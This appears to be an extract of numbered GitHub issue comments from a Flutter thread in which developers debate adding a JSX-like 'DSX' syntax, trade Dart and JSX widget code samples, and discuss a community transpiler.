`<tag attrib={<anotherTag.../>}/>`


"
2875	@cbazza Yeah, the third case is quite common in Flutter, so it makes sense to skip the extra `{` nesting.
2876	@abarth Ah but I am making most of those things unnecessary by using css-like styles !!! The transpiler expands these css-like styles into appropriate Flutter calls. Now the tagging structure is much cleaner and styles can be easily imported from designer tools like InVision, Figma, Atomic, etc
2877	"@cbazza Cool, I use many widgets with closures like `FutureBuilder`. I hope your transpiler can generate something like,
```jsx
return new FutureBuilder(
  future: Firestore.instance
      .collection('stuff')
      .document(id)
      .get(),
  builder: (context, snapshot) {
    if (!snapshot.hasData) {
      switch (snapshot.connectionState) {
        case ConnectionState.waiting:
          return const Text('Loading...');
        default:
          return new Text('${id} not found');
      }
    }

    return new Text(snapshot.data['name']);
  },
);
```"
2878	"@jayjun, Yes, that's not a problem. The transpiler is a simple XML processor and when it comes to parsing expressions (everything inside {}), it just becomes a text blob so it writes it out verbatim. 
"
2879	"@xinthink 
> Would it be possible to build a DSL like what the Kotlin team did for Android developers?

Seems like a lot of people would like to use Kotlin with Flutter. Honestly, I don't understand, why did the developers decide to reinvent the wheels in Dart? 

In my humble opinion, Flutter doesn't need JSX. Flutter should have chosen Kotlin instead of Dart. Kotlin allows us to write complex ui logic with beautiful syntax out of the box, has huge community, production-ready tools, battle-tested in Android development...

Just saying. "
2880	"Kotlin is nice, I am a fan *but* it doesn't run on iOS..... actually it does but it hasn't been released yet (pre-release stage right now).
For UI/UX development I still prefer JSX instead of Anko DSL. I like the fact that I can visually separate declarative markup from imperative code and be able to mix and match components together quite easily.  

"
2881	"Dart, Kotlin and Swift all have similarities :
https://sethladd.github.io/swift-is-like-kotlin-and-kinda-like-dart/

I like that :
1. Dart is more familiar if you come from Java. 
2. You can take your Dart skills and use them to build web pages - which is valuable when creating apps, you can build features on the web (and show them in a WebView) where it makes more sense (maybe quick admin pages or product listings which need to be google indexed). 
3. Dart was built from the start to compile to javascript which I assume is not easy to add to a language later.

These are basically the reasons I chose Dart over Kotlin / Swift / React.

_Although the decision to support Dart and Swift in googles new Fuchsia OS is confusing to me._"
2882	"I am not sure Dart is more familiar if you come from Java. I came from Java and have no problems with Kotlin or Swift; basically the type declaration is reversed, nothing really new as it was used in Pascal and ActionScript.

Yes, you can build web pages with Dart but I don't see major take up with that. The only other language that is doing well on the web is TypeScript, since it integrates well with the top 3 most popular web frameworks. 

Take a look at the different syntax available for React on the Web:
https://github.com/Workiva/over_react#fluent-style-component-consumption
Both Dart versions have no chance against JSX !!!

TypeScript was designed to compile to Javascript and it is better than Dart for that. It also supports JSX.
Dart is getting squeezed from all sides. Swift has momentum so it is wise to support it on Fuchsia OS along with your baby.
"
2883	"How long until the prototype? I'd love to use it!

I used React for a while, and JSX increased my productivity ten-fold. This isn't a controversial issue: other teams decided, correctly, that this would be better, so why not Flutter? (Rhetorical: I read the thread... (facepalm))"
2884	"I am working on it this weekend but I keep increasing the scope with new ideas so hopefully I can have something out this weekend.

Some of the interesting things I am experimenting with:
1) using xml namespace on child tags so they get inserted with correct Dart named argument in the parent.
2) spread operator to better organize style like properties so they can be defined/grouped outside xml in a map and then brought in and spread on a tag like typical React stuff. 
3) styleCSS property that generates flutter styles from CSS.

(1) & (2) are generic so works for all Dart Flutter code.
(3) is specialized per Flutter Widget (Container, Text, etc) and I am only doing those 2 for now.
"
2885	"@yuriy-manifold just because something worked for JS doesn't mean it's a good idea for Dart.
If you had read above discussions, you'd see that in fact it **is** controversial. 
I don't see why 2 languages would be better than one."
2886	"> just because something worked for JS doesn't mean it's a good idea for Dart.

JSX is an incredible idea for UI/UX development in a reactive framework regardless of language. If I had more free time I would put out LSX which is JSX for Logo ;)

> I don't see why 2 languages would be better than one.

You can program iOS with Objective-C and Swift (2 languages)
You can program Android with Java and Kotlin (2 languages)
..."
2887	"I have yet to see an argument in favor of JSX. 
Above discussions only contains arguments like ""it's better"", ""it increases productivity"", or similar but no argument **why** or **how** it would actually be better than pure Dart code, especially considering planned language changes that would reduce the difference between JSX-like and 
pure Dart code even more. 

@cbazza 

> You can program iOS with Objective-C and Swift (2 languages)
> You can program Android with Java and Kotlin (2 languages)

How is that related to the JSX discussion? How can that be considered an advantage?
You can use Swift on iOS because it's the successor of Objectiv-C.
You can use Kotlin on Android because it's considered a slick improvement to Java.
That sounds like you argue that JSX should replace Dart. That doesn't make much sense to me.  "
2888	"@zoechi 
> How is that related to the JSX discussion? How can that be considered an advantage?
You can use Swift on iOS because it's the successor of Objectiv-C.
You can use Kotlin on Android because it's considered a slick improvement to Java.
That sounds like you argue that JSX should replace Dart. That doesn't make much sense to me.

You actually said it (JSX is a slick improvement over the current way) but came up to the wrong conclusion (JSX to replace Dart).
"
2889	"@cbazza that's just more of the same

what is the actual advantage over plain Dart?

""JSX is a slick improvement"" is just not convincing in any way and isn't an argument.
It's just a personal opinion without (again) any argument to back it up,
similar with other pro-JSX arguments above. 

You can't expect anyone to consider your suggestions if you're not willing to provide good arguments.

Adding something like JSX to Dart causes an awful lot of work and complexity in the Flutter tools and the IDE. You need to provide proper arguments for others to even consider looking at it.
"
2890	"@zoechi sounds like a broken record asking for 'good' arguments, plenty were given before but you just didn't get it; which is OK, 'to each their own'.

> Adding something like JSX to Dart causes an awful lot of work and complexity in the Flutter tools and the IDE. You need to provide proper arguments for others to even consider looking at it.

Not really, my work is almost ready and it took me very little time considering I only worked on it on weekends. 

Again, DSX is just a slick improvement that people can choose to use or not, because it doesn't change the current way, it just provides an alternative that others (React developers) will be instantly familiar with.

"
2891	"@cbazza 

> plenty were given

not really. Just general claims which can be true or not. 
No additional details were provided that would allow others to verify.

> Not really, my work is almost ready

Great. Then there is no need for the Flutter team to do anything and the issue can be closed ;p
Does this include support autocompletion and syntax checks in all IDEs supported by Flutter?"
2892	"> Great. Then there is no need for the Flutter team to do anything and the issue can be closed ;p

;)

> Does this include support autocompletion and syntax checks in all IDEs supported by Flutter?

Most IDEs already support XML and JSX so it wouldn't be hard for them to add my minor additions.
"
2893	"I wonder if the JSX syntax might be more appreciated in angular Dart ? It seems like its more of a what-you-are-used-to situation rather than ""better"". The JSX syntax probably feels more natural for web developers. 

I know that programming feels awkward for me even just using different code highlighting colors for a day.

https://blog.dantup.com/2014/08/you-have-ruined-html/
 "
2894	"Yes, Angular people will be very comfortable with JSX but so will React Native devs and this is for mobile development. JSX will certainly not be taken by current Flutter devs but this second alternative will attract new devs to Flutter and that's for sure.

The article above got it so wrong, React without JSX is basically non-existent and all reactive web frameworks do allow mixing of markup and programming on their DSL.  
"
2895	"Time has come... 
It's with great pleasure that I announce the online DSX transpiler
https://spark-heroku-dsx.herokuapp.com/index.html"
2896	"Nice job with the transpiler cbazza
One thing I would say is easier to follow with JSX is the closing tags. The idea which I mentioned before :
[Idea: Auto generated closing tags](https://github.com/flutter/flutter/issues/14419)

In your first example, would give flutter code of (removed the optional new in future Dart) :

    Material(
      child: Column(
        children: <Widget>[
          MyAppBar(
            title: Text(
              'Example title',
              style: Theme.of(context).primaryTextTheme.title,
            )-Text,
          )-MyAppBar,
          Expanded(
            child: Center(
              child: Text(
                'Hello, world!',
              )-Text,
            )-Center,
          )-Expanded,
        ],
      )-Column,
    )-Material;
"
2897	@cbazza I appreciate your work for the community and the people who want to build UIs that way, but I really hope I'm never forced to use anything like that in Flutter :-(((
2898	"As a newcomer to Flutter but pretty familiar with React, a few things stood out to me:

- The state management model is pretty much the same
- The widget/component virtual render tree is pretty much the same
- Knowing the state and component model, I basically feel ready to write an app now, excepting some Dart specifics and platform APIs, but...
- The styling language is a stumbling block. I'm referring to https://flutter.io/web-analogs/ but it's not easy to figure out what imports are required to make things work (EdgeInset? Color?) or when I should use primitives instead of class instances.
- The CSS parser from @cbazza's DSX converter is really useful for figuring out layout equivalents in the Flutter model.

Regarding JSX:
- I don't think it's necessary to invent new JSX syntax to support Flutter patterns. Some of the syntax quibbles in the this thread could be resolved using some of the newer React patterns like [higher-order-components](https://reactjs.org/docs/higher-order-components.html) (functions that build component classes) and [render props](https://reactjs.org/docs/render-props.html) (components that take functions as arguments; the functions return elements). E.g., named ""child slots"" could translate to something like this in JSX:

```jsx
<Item
  right={() => new Text(""Right"")} {/* a named slot */}
  left={() => new Text(""Left"")}> {/* another named slot */}
  <ChildOne /> {/* generic children prop with 2 children */}
  <ChildTwo>
    <NestedChild />
  </ChildTwo>
</Item>
```

- The best argument against JSX I saw was that Dart has named arguments.
- Why is it important for an element to know whether it has multiple children or one child? Maybe a [""fragment"" construct](https://reactjs.org/docs/react-api.html#reactfragment) could disambiguate that API.
"
2899	I still think, as a newcomer to Flutter with some experience with Angular, React, etc., that the regular Dart way, and more in the Dart 2.0, is better than this DSX. It just makes more sense than some XML and CSS-ish parameters. 🤷‍♂️ 
2900	"@cbazza your second demo example has 466 chars compared to dart's 391 (both without spaces). To me it looks visually bloated. I would have to learn it's semantics, which I don't have to with normal Dart code. And I have no idea how to use general purpose programming paradigms with it (if, forEach, etc.).

If I had the choice, I would stick with the present model."
2901	"Everyone is just giving its own subjective opinion on comparing both syntaxes, but we have to agree on one fact: it's a very controversial feature. There is love and hate, but most opinion diverge on the usefulness of JSX over plain Dart.

In any case I think it's totally unreasonable to ask the Flutter team to commit to support this feature before the 1.0 release. While the current way of building UI may not seem great for everyone - it works (and it works great in some opinions). 

If people really want a JSX-like syntax now, a community driven effort seems like the way to go. And it would help make the case (or not) when the Flutter team considers it in post 1.0 release. 

Personally I strongly agree with the following argument: it's not because JSX works for React (where you are already building the UI using a markup language) that it automatically works for Flutter.

"
2902	"@tehfailsafe 

> The great news is that even is this was adopted by the Flutter team (which isn't likely based on this thread) no one would be FORCED to use it. It's an OPTION. I don't understand why it's so emotionally charged that some people might like writing code with a syntax you don't like...

I don't care what other people like or don't like. But I care about features that help me progress with my application. Resources are limited, and I would rather have a proper video/stream player, native child views, and some vector graphics format.

> For example, right now in React and React Native you can write your whole application without JSX, it's just an option. Here's what React looks like without JSX:
> [...]
> It's a lot messier than the JSX version, and almost no one uses it. That's probably why some of us who are coming from React would appreciate the possibility to avoid having to do it this style again.

That's because the web was not designed for a system like that. If you have a static markup language like HTML and want to ""dynamise"" it, you have to invent a system that needs to work ontop of that. What you will end up with is some construct that is constrained by the underlying platform.
(see: https://gbracha.blogspot.de/2014/09/a-domain-of-shadows.html)

Flutter on the other hand has no markup language. I have yet to see a reason to invest resources into something that is less dynamic and less expressive."
2903	"I would like to know if people who disagree with it have used React with and without JSX. I encourage everyone to try it, so this discussion would be less theoretical. After the initial shallow learning curve, it becomes very natural (and it's not all about the number of characters, because the closing tags allow you to read it easier). It's not different from learning anything else that's new, like Flutter, which in the long run boosts productivity. And I agree that it's not for everyone, which is why it would be optional.
I think it's important to keep in mind that we have one another's best interests in mind - making it easier to build stuff. I think this transpiler would help, and it would be easier to adopt if it had official support.

Also, Thank you @cbazza :)"
2904	"@yuriy-manifold 

I don't think anybody here doubts that JSX React is an improvement over classic React. But like I said, that solution was created because of problems related to properties of the underlying platform. Flutter doesn't have these properties.

The question is not 'is JSX helpful for React?' the question is 'is something like JSX helpful for Flutter?'.

I think the answer is no."
2905	"There are a few other things to consider:

- Separating layout specification from app code can make code more future-proof; e.g. this Dart 2 syntax proposal would not affect `build` methods if they were transformed according to an upgradeable pragma into Dart code from an agnostic format like JSX.
- Defining the layout as markup makes it possible to separate the render engine from the (stateful/virtualized) widget engine ala React's relationship with ReactDOM and React Native, potentially making it easier to port widgets to new platforms.
- Defining the markup format makes it easier to port existing layouts to Flutter, for example from Sketch or other design tools"
2906	"> Nice job with the transpiler cbazza

@Rockvole, thank you.

>  I appreciate your work for the community and the people who want to build UIs that way, but I really hope I'm never forced to use anything like that in Flutter :-(((

@zoechi, thank you. Yes, it's just another option for people who love JSX to use. If that's not your thing cool continue doing as you are doing, nothing changes there.

> I don't think it's necessary to invent new JSX syntax to support Flutter patterns.

@alexkrolick, yes you can use render props for the named parameters but there is nothing you can do about the positional parameters. The key was that I didn't want to hard code anything in the transpiler so that it would work for everything.

> I still think, as a newcomer to Flutter with some experience with Angular, React, etc., that the regular Dart way, and more in the Dart 2.0, is better than this DSX. It just makes more sense than some XML and CSS-ish parameters. 

@tenhobi, great use that then, obviously DSX is not for everyone. 

> If I had the choice, I would stick with the present model.

@b-strauss, this is not a replacement, it's an option for people that like JSX.

> There is love and hate, but most opinion diverge on the usefulness of JSX over plain Dart.

@lukaspili, DSX is for React Native people that love JSX, if you don't see its benefits, don't use it. It's not DSX versus plain Dart. It's DSX vs. JSX, the closer the 2 are the better.

> The great news is that even is this was adopted by the Flutter team (which isn't likely based on this thread) no one would be FORCED to use it. It's an OPTION. I don't understand why it's so emotionally charged that some people might like writing code with a syntax you don't like...

@tehfailsafe, thank you for listening !!! You hit the nail on the head why such huge resistance to something that will make React Native people really happy.

> I don't care what other people like or don't like. But I care about features that help me progress with my application. Resources are limited, and I would rather have a proper video/stream player, native child views, and some vector graphics format.

@b-strauss, Once React Native fans move to Flutter there will be tonnes of people to help out on these other needed things. Priority 1 is to steal mind share from React Native and make it as simple as possible for React Native people to move over.

> Flutter on the other hand has no markup language. I have yet to see a reason to invest resources into something that is less dynamic and less expressive.

@b-strauss, How is DSX 'less dynamic' and 'less expressive' than plain Dart? DSX is Dart didn't you try the transpiler.

@yuriy-manifold, thank you.

> The question is not 'is JSX helpful for React?' the question is 'is something like JSX helpful for Flutter?'.

@b-strauss, off course it is. it is not helpful for current Flutter devs but it is very helpful for designers that can output CSS from their tools, it is very helpful for people vested in the React Native platform. 

@alexkrolick, very good observations.

"
2907	"@cbazza 

> this is not a replacement, it's an option for people that like JSX.

I get that... It wouldn't affect me in that way, but as I said before, there are missing features right now that I need to create a flutter app.

> Once React Native fans move to Flutter there will be tonnes of people to help out on these other needed things. Priority 1 is to steal mind share from React Native and make it as simple as possible for React Native people to move over.

So you propose the flutter team should put features on hold for something that is questionable and may or may not attract a fraction of a specific subset of web developers?

> How is DSX 'less dynamic' and 'less expressive' than plain Dart? DSX is Dart didn't you try the transpiler.

Every DSL is by definition less expressive than a GPL. With DSX how do I conditionally hide a widget? How do I iterate over a collection and map every element to a widget? How do I use a switch? You now have to make up syntax and semantics for constructs that you already have in your GPL. So why invent the DSL in the first place?

> off course it is. it is not helpful for current Flutter devs but it is very helpful for designers that can output CSS from their tools, it is very helpful for people vested in the React Native platform.

That wasn't the question... What problems would a DSL solve that you can't solve right now? You keep saying it's better, why is it better? I have no doubt DSX would attract some JSX people. I know people don't like things that are different. And familiarity seems to be the only argument. So why not use CSS?
 Why not use JavaScript? More people know how to use these than Dart.

If you design your system based on some other thing for the sole purpose of being familiar, you're not really innovating."
2908	"@b-strauss to be clear, JSX compiles to function calls (in React calls to `createElement(ComponentClass)`, in Dart it should be constructors).

```jsx
<A property=""a"" />
new A(property: a)
```

```jsx
<A property=""a"">
  <B />
  <C />
</A>
new A(property: a, children: <Widget>[new B(), new C()])
```

The only constructs are the transforms between the element names+attributes and the function calls+arguments, and escaped expressions (`{...}`). 

- With DSX how do I conditionally hide a widget?

```jsx
(JS)
  { condition && <A /> }
  { condition ? <A /> : <B /> }
```
- How do I iterate over a collection and map every element to a widget?

```jsx
(JS)
  { ['a', 'b'].map(i => <A property={i} />) }
```

- How do I use a switch?
As far as I know in Dart as in JS, you can't use a switch inline as it is not an expression. If you are outside of the widget tree you can just use a switch normally.



"
2909	"
> So you propose the flutter team should put features on hold for something that is questionable and may or may not attract a fraction of a specific subset of web developers?

@b-strauss, React Native is not web development, it's cross platform mobile development that is the main competitor to Flutter; and yes JSX is like a light source, it will attract lots of React Native devs. I asked for this feature in Aug 2017, too much talking too little action.

> Every DSL is by definition less expressive than a GPL. With DSX how do I conditionally hide a widget? How do I iterate over a collection and map every element to a widget? How do I use a switch? You now have to make up syntax and semantics for constructs that you already have in your GPL. So why invent the DSL in the first place?

You are completely wrong. The good news is that I was once wrong too. Most (but not all) DSLs try to recreate programming constructs in markup (and that is not very powerful), JSX brings markup into programming (taking full advantage of the host language). The difference is transformational. The answer to all your questions is basically use the way you do it in Dart because it is Dart. Everything in between '{}' is Dart code with the exception of the spread operator. It's all dart expressions but you can also use anonymous functions that returns an expression. As you see in the transpiler a tag (\<Text>) is just a new on a widget (new Text()). 

> What problems would a DSL solve that you can't solve right now? 

Why use Dart when you can use zeros and ones, isn't that all that is necessary to solve any computing problem?

> You keep saying it's better, why is it better? 

I gave my reasons before and won't repeat them here. JSX people will agree with me but 'to each their own'.

> I have no doubt DSX would attract some JSX people. I know people don't like things that are different. And familiarity seems to be the only argument. So why not use CSS?
Why not use JavaScript? More people know how to use these than Dart.

Yes, using CSS makes sense to ease the designer-developer workflow. DSX supports that. The advantage of Dart over Javascript is execution speed (performance).   

> If you design your system based on some other thing for the sole purpose of being familiar, you're not really innovating.

You are so full of wrong biases that are most likely preventing you from reaching your full potential. Open your mind, try different things. 
"
2910	@alexkrolick , thank you for the details. 
2911	"@cbazza 

> You are so full of wrong biases that are most likely preventing you from reaching your full potential. Open your mind, try different things.

I will unsubscribe from this issue now. Please never mention me here or anywhere again, thx."
2912	"@b-strauss 

Sorry guy, I didn't mean to hurt your feelings... I was just trying to gently guide you while trying to manage my own frustrations. We are all humans after all.
"
2913	@cbazza Can you send me an email please? ian@hixie.ch
2914	"Already made this proposal in the old thread but I still think that's an important point

IMHO removing the need to use `new/const` already helped a lot. I have real difficulties in the way dart format formats the trees. it does not emphasis enough the tree structure IMHO compared to:

```dart
    return Scaffold(
      appBar: AppBar(title: Text(""WeatherDemo"")),
      resizeToAvoidBottomPadding: false,
      body: 
        Column(children: <Widget>
        [
          Padding(
            padding: const EdgeInsets.all(16.0),
            child: 
            TextField(
                    key: AppKeys.textField,
                    autocorrect: false,
                    controller: _controller,
                    decoration: InputDecoration(hintText: ""Filter cities"",),
                    style:  TextStyle(fontSize: 20.0,),
                    onChanged: ModelProvider.of(context).textChangedCommand,
                    ),
          ),
```
"
2915	"I agree for the purpose to make flutter simple that don’t want to use JSX-like syntax, and I also support the concept of split into multiple widgets, but now it let me feels like the MVC era is back in jquery. Such a scenario that there was a simple widget, with padding,border and center layout for it later, many  ""} "" symbol seriously affect the readability.However, it is a integral widget, I don't want to split it, any useful solution? Though my english is poor,I try hard to express my thoughts."
2916	"Lord help us all.

Ok, this is going nowhere. It doesn't look like anyone's about to switch sides anytime soon. We definitely need to reach some sort of compromise here. Of course ""pro-DSX"" vs ""anti-DSX"" doesn't really have a remotely satisfying compromise, which is a frustrating realization. Could we possibly reframe our positions so that they could be more compatible?"
2917	"@naiveaiguy ""they"" can have their DSX. 
If the Flutter team doesn't implement it, it can be an open source initiative. 
That doesn't mean the pure-Dart approach like it is now won't work anymore.
Both worlds can co-exist."
2918	I agree so much with @zoechi that they can co-exist...thats it and I thought this had been settled on the old thread
2919	"@lrhn

> Please everybody, be civil and constructive. We are discussing style here, something very subjective, so no matter how much everyone likes their own preference, it is unlikely to be inherently superior to everybody else's. Do list the advantages and disadvantages that you see with existing and proposed syntaxes, but remember that not everybody sees it the same way, and that's perfectly fine.

Bravo, that's absolutely it.

In React you can do it 4 ways (and I just found out about the other 2 ways today !!!)

(1) You can use JSX (which is what I like)
https://reactjs.org/docs/introducing-jsx.html

(2) You can use the original way (which is similar to Flutter)
https://reactjs.org/docs/react-without-jsx.html

At the end of the link above they even mention 2 promising community projects

(3) Hyperscript syntax for React.js markup
https://github.com/mlmorg/react-hyperscript

(4) Terse syntax for hyperscript.
https://github.com/ohanhi/hyperscript-helpers


Having alternatives is a good thing, gone are the days where you could get a Ford in any color you liked as long as it's black :)

"
2920	"@naiveaiguy why is it an issue for you if there is the current approach **and** DSX?
(that's what I derive from your downvotes)"
2921	"> @naiveaiguy ""they"" can have their DSX.
> If the Flutter team doesn't implement it, it can be an open source initiative.
> That doesn't mean the pure-Dart approach like it is now won't work anymore.
> Both worlds can co-exist.

I fully agree with this. Though i think it should be a pluggable rather than an out-of-the-box solution. Having one standard that works but being able to customize the experience with extra things is a great paradigm. That way the Flutter team can keep its focus on (what i believe are) more relevant issues, the community can experiment with different tools/solutions and then we can have a discussion with more data and experience with DSX or any other alternatives to the current meta.

> Having alternatives is a good thing, gone are the days where you could get a Ford in any color you
> liked as long as it's black :)

True that. However, i think we can all agree we don't want Dart/Flutter to become another JS/Web Frontend ecosystem. Flutter isn't even out of beta yet and we're already want it to have 2 standards for something kinda subjective.

> In React you can do it 4 ways (and I just found out about the other 2 ways today !!!)

Most are community driven though React refers to them. Good midway. Now, only 2 of them are officially supported: the `React.createElement` and the JSX way, which is a wrapper over the other one. The value of JSX is notorious in that context but it is not that clear over here. With this in mind, can we meet midway by having only one official standard and the docs referencing DSX whenever relevant?

I believe the Flutter team should be focusing on the lacking features that truly prevent developers from building apps. I can't recommend Flutter to my managers if we can't even add Maps support and developing a Camera features takes 2 weeks.

Bear in mind, I'm not closing the door on DSX forever. Maybe it will become the solution for UI building but we need the community experimenting with it to make that decision.
"
2922	@zoechi Personally I don't believe the two ideas can coexist in the current state of Flutter - we really shouldn't be encouraging a split of this nature this early - but at this point it looks like the only compromise.
2923	"@naiveaiguy 
 
> Personally I don't believe the two ideas can coexist in the current state of Flutter - we really shouldn't be encouraging a split of this nature this early

Could you be more specific as to why they can't coexist ? (given the fact that DSX is just syntatic sugar; or as @emalamela says ""just a wrapper of the current way"").
 
Also why is it too early to provide a different syntax to exactly the same thing? I am basically asking why is there a need to delay this, what would be different in the future that is not there yet right now?

@emalamela

> However, i think we can all agree we don't want Dart/Flutter to become another JS/Web Frontend ecosystem.

Personally I rather not put any limits on what people can do with Dart/Flutter. Let the market/community decide. Basically if what is created doesn't add value, people won't use it and it will die. If it becomes popular, it is because the community found it useful and valued it. No need to pick winners and losers right now.

"
2924	"The only thing that is stopping me from giving Flutter a try is the fact that they chose not to use JSX.
IMHO JSX is the best choice to express component hierarchy "
2925	"Heard about Flutter, wanted to give it a try, immediately stopped even considering that the minute I saw the syntax, which is a shame because chances are that this a great piece of tech. to build products.

I've been doing React/React Native development for the past 2.5 years, sacrificing the productivity leverage the JSX syntax offers when it comes to describing UI is a lot to ask. I would seriously consider spending the time to learn all about Flutter and study whether it's worth switching to when such a feature is supported out of the box.

I can't even imagine the numbers of potential adopters/users/devs Flutter is losing because of this, will revisit in the next months."
2926	"> I can't even imagine the numbers of potential adopters/users/devs Flutter is losing because of this, will revisit in the next months.

Yeah, 44 <strike>Mio</strike> found it even important enough to upvote :D

"
2927	"> Yeah, 44 found it even important enough to upvote :D

When sorted by 'upvote', this feature request is listed 7th on the list of 3131 opened tickets though.

https://github.com/flutter/flutter/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc

"
2928	"@cbazza I don't want to argue against the feature but comments like ""if you don't do x then horribly y will happen"" are just ridiculous."
2929	"> I've been doing React/React Native development for the past 2.5 years, sacrificing the productivity leverage the JSX syntax offers when it comes to describing UI is a lot to ask. I would seriously consider spending the time to learn all about Flutter and study whether it's worth switching to when such a feature is supported out of the box.

@sonaye 

Since you mentioned productivity, can you provide an example that clearly showcases the productivity loss of using Flutter's Pattern instead of JSX? The example should be built with the basis of knowing enough JS **and** Dart to be able to code said example. I believe that if we don't take that into account then we are also comparing programming languages, which is not the same discussion.

> When sorted by 'upvote', this feature request is listed 7th on the list of 3131 opened tickets though.

@cbazza

It is also the most downvoted one. It's quite controversial.

"
2930	"@emalamela,
> It is also the most downvoted one. It's quite controversial.

Since this feature request is an alternative to the current way and it doesn't change the current way, there shouldn't be any controversy at all; if you don't like JSX/DSX continue programming as you do today. 

The so called controversy only exists because the Flutter team needs to do work to enable the community to do DSX properly. If the Flutter tools (compiler, analyzer, ide support, etc) supported pre-processing with source maps, DSX would had been done long ago, and most likely other language innovations/ideas, from 3rd party developers, would had happened too.


"
2931	"```js
new Card(
  child: Column(
    crossAxisAlignment: CrossAxisAlignment.start,
    children: <Widget>[
      AspectRatio(
        aspectRatio: 18 / 11,
        child: Image.asset('assets/diamond.png'),
      ),
      new Padding(
        padding: EdgeInsets.fromLTRB(16, 12, 16, 8),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: <Widget>[
            Text('Title'),
            SizedBox(height: 8),
            Text('Secondary Text'),
          ],
        ),
      ),
    ],
  ),
)
```

Becomes:

```js
<Card>
  <Column crossAxisAlignment={CrossAxisAlignment.start}>
    <AspectRatio aspectRatio={18 / 11}>
      <Image src={asset('assets/diamond.png')} />
    </AspectRatio>

    <Padding padding={EdgeInsets.fromLTRB(16, 12, 16, 8)}>
      <Column crossAxisAlignment={CrossAxisAlignment.start}>
        <Text>Title</Text>
        <SizedBox height={8} />
        <Text>Secondary Text</Text>
      </Column>
    </Padding>
  </Column>
</Card>
```

@emalamela The argument for and against JSX has been exhausted by discussion, there is plenty of material that you can look up. I'm only sharing my personal opinion.

First, code readability. I can immediately get a crisp clear idea about the structure of the UI in JSX (takes seconds), the mental modal is very visual. Second, usability. I would argue that JSX can be used even without knowing JS/Dart or anything about underlying API. This is very suitable for someone who is just learning programming, or for some one who is a part of my team, designers now can [code](https://airbnb.design/painting-with-code/) the UI. 

The description of the application is completely declarative (not just expressive), when you work on a large project with hundreds of components, this way of describing UI makes a huge difference (you have to try it to really appreciate it). I didn't like JSX when I first saw it too, once I used it just felt right, this how I want to describe UI from now on, it was a clear breakthrough in the way I approach building interfaces.

It's not about writing less lines of code, it's not about having a ""syntax sugar"", it's about building tools for humans. I'm also against the argument that everyone should use JSX, this is ridiculous. You use the tool that let's you get your work done faster with less confusion, in the case of many (including myself), it would be JSX (or DSX in the case of Flutter), that's all."
2932	I'm coming from React, and first time trying out Flutter. It's really odd that flutter team doesn't have JSX syntax, I mean seriously! In JS world, JSX is extremely prevalent in every React-alternatives now a days! JSX is super friendly for developers. Please implement this ASAP, so you can help grow the community.
2933	"You can tell JSX (or DSX in this case) is a big deal just by looking for the amount of comments in this issue. 

JSX is something that you don't know you love until you try it. It's weird at first to have markup in your code but then it becomes awesome.

It seems unnecessary for guys that already know flutter/dart, I get it. But for someone that never touched dart (like myself), JSX is way easier to start with and that's the point. If you guys want more people to come by and start building a lot more awesome stuff, the tooling needs to be easier.

And, as @eseidelGoogle (https://youtu.be/h7HOt3Jb1Ts?t=2m41s) told the other guy ""Flutter is a way to write to iOS and Android in a single codebase. We try to make that **fast and easy** [...] Flutter talks all the way down to the hardware [...] We have a very layered approach, so you can take as little or as much as you want. [...] We have a bunch of investment in **tooling**.""

Implement JSX, pretty please."
2934	I'm a fan of Dart and also a heavy user of react. I always find Dart terser and more maintainable than JSX. So, I think JSX/DSX could and maybe should implemented in a community way.
2935	"@rajaraodv Just because Flutter is promoted as reactive style framework doesn't mean it's just a Flavor of ReactJS.
From most comments I get the impression people just have troubles accepting that something new isn't the same as what they already know.

You could try to work with Flutter for a while how it currently is and then provide proper arguments why you think JSX/DSX would be better then plain Dart **in a factual way** instead of just ""because of personal preference"" or ""because it's better""."
2936	"@zoechi, you are missing something: flutter was inspired from React, according to the Flutter doc.
Maybe it is only my issue. I really feel that I have a hard time to read the UI code, even it is in Dart 2 syntax.  
"
2937	"> flutter was inspired from React Native

I don't see how that says ""everything is the same except the language is called Flutter instead of JS"".

> I really feel that I have a hard time to read the UI code

and you claim the only imaginable solution to that is DSX?

Have you considered that Flutter is not even 1.0 and that IDE support can improve over time?

There were only the first tiny steps taken recently to get better Flutter IDE support in the code editor like quick fixes (""wrap xxx"") and closing labels.

There are unlimited possibilities to improve developer experience and most in this discussion is like
""Flutter is not yet perfect and therefore we need DSX"" 
usually without concrete arguments about how or why DSX would solve or improve that. "
2938	"@zoechi ,

> You could try to work with Flutter for a while how it currently is and then provide proper arguments why you think JSX/DSX would be better then plain Dart in a factual way instead of just ""because of personal preference"" or ""because it's better"".

Once again Plain Dart or DSX is simply a matter of style, no point arguing which is better. It is just a personal preference and people have their reasons for picking one or the other. 

What has happened in the React World is that once you go with JSX, you simply don't go back. As others have stated above you get hooked on JSX after using for awhile. JSX has been adopted by others outside React's World (Typescript, Vue) and it is a great fit for Flutter.

> and you claim the only imaginable solution to that is DSX?

What the community needs is generic pre-processing capabilities with source map support built in the Dart tools (compiler, analyser, IDE, etc) so that DSX or anything better can be developed by the community and fully integrated into Flutter (debugger, auto-complete, etc).

> There are unlimited possibilities to improve developer experience and most in this discussion is like
""Flutter is not yet perfect and therefore we need DSX""
usually without concrete arguments about how or why DSX would solve or improve that.

Sure, thing is this ticket is not about a generic 'improving the developer experience' thing. It is very specific and it is about getting JSX support in Flutter. The community wants DSX as an alternative to the plain Dart way. 





"
2939	"I cannot see myself using this (but I'm willing to give it a try). I dont think this is a silver bullet, but there is so much enthusiasm that its worthwhile doing.

I think google should remove the language obstacles to allow the community to build what they want.
"
2940	"I'm not aware of any obstacles preventing someone outside Google's Flutter/Dart teams from writing a JSX-like thing for Dart/Flutter.  I would *love* to see bugs on those if someone is trying.  (It's also possible that I've missed them in the comments above, since I admit not to having read every word of this very long bug.) :)

Thanks!  Glad to see such enthusiasm!"
2941	"@eseidelGoogle,

How would Intellij and/or VS Code (with Dart-Code) be able to set breakpoints and step through code from a .dsx file ? (I mean this is not a .dart file). How about auto-complete functionality from the .dsx file  (as with a .dart file) ?

You have invested a lot on the tooling but the tooling does not support pre-processing (with source maps) of a new language (like DSX) that transpiles into Dart/Flutter seamlessly.

A transpiler is available but there is no easy way to fully integrate it:
https://spark-heroku-dsx.herokuapp.com/index.html

P.S. This ticket is only half of the comments !!!
https://github.com/flutter/flutter/issues/15922
"
2942	@cbazza is there a repo with that compiler somewhere? It would be great to share the code and get the community involved on hacking on it, even if it isn't perfect.  
2943	"@jonahwilliams, no the DSX transpiler code has not been released because it is way too early for that.
